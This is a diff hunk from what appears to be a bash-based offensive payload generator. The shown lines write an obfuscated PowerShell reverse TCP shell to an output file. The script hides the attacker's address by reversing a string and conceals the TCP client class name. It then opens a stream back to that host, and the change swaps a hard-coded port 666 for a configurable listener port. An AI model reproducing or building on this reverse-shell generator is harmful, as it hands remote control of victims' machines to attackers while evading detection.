@@ -13192,7 +13192,7 @@ if [ "$ObfuscationType" = "PSrevStr (new)" ]; then
    echo "\$Cofre = \"$revtcpip\";\$Chave = \$Cofre.ToCharArray();" >> $IPATH/output/$NaM.ps1
    echo "[Array]::Reverse(\$Chave);\$RSAx504 = (\$Chave -Join '');" >> $IPATH/output/$NaM.ps1
    echo "" >> $IPATH/output/$NaM.ps1
-   echo "\$proxy = New-Object System.\$CmdLine(\$RSAx504, 666);" >> $IPATH/output/$NaM.ps1
+   echo "\$proxy = New-Object System.\$CmdLine(\$RSAx504, $lport);" >> $IPATH/output/$NaM.ps1
    echo "\$DataRaw = \$proxy.GetStream();" >> $IPATH/output/$NaM.ps1
    echo "[byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/$NaM.ps1
    echo "" >> $IPATH/output/$NaM.ps1
